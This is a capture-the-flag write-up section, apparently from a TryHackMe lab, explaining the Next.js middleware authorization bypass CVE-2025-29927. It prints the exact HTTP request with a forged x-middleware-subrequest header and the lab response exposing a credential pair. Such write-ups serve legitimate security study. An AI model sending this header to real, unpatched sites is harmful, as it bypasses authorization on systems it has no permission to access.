## 5. Flag 1 — CVE-2025-29927 (Next.js Middleware Authorization Bypass)

### The vulnerability

Next.js middleware (used for things like auth checks before a request reaches a page) runs as part of the routing layer. CVE-2025-29927 affects versions where the framework trusts an internal header, `x-middleware-subrequest`, as a signal meaning *"this request is an internal rewrite Next.js generated for itself — skip re-running middleware on it, to avoid infinite loops."* Because that header is only meant to be set by Next.js internally, affected versions never validate that it actually came from the server and not from the client. Setting it on an external request convinces the framework the middleware (where the auth check lives) has already run, so it skips straight to the protected route.

### Exploiting it

The internal app on port 10000 gates `/customapi` behind this middleware. Through the gopher proxy (pointed at port 10000):

```http
GET /customapi HTTP/1.1
Host: 127.0.0.1:5000
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

(The repeated `middleware:` segments match the internal path Next.js uses to track nested middleware invocations in the vulnerable versions — a single value doesn't always trigger it, repeating it does.)

**Response (relevant excerpt):**

```
This API is currently under maintenance. Please use the library portal to
add new books using librarian:L1br4r1AN!!

First flag is THM{***REDACTED***}
```

**Flag 1:** `THM{***REDACTED***}`
**Credentials recovered:** `librarian:L1br4r1AN!!`

